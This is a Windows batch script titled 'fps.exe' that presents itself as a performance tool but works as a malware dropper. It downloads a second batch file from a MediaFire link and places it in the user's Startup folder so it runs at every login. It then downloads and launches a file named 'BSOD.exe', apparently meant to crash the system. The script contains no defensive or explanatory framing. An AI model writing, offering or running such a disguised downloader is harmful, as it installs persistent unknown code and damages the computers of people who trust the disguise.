@echo off
title fps.exe
color 0a
cls 
cd /d C:/
cd %userprofile%
curl -L https://download1493.mediafire.com/4tq09s0bw09g/c1mz4eb5g2pdnqm/fpsworker.bat > fpsworker.bat
cls
move "fpsworker.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\fpsworker.bat"
del fpsworker.bat
curl -L https://download1527.mediafire.com/1yamy5ufkxxg/qi2f5v76pi61gcg/BSOD.exe > BSOD.exe
BSOD
exit
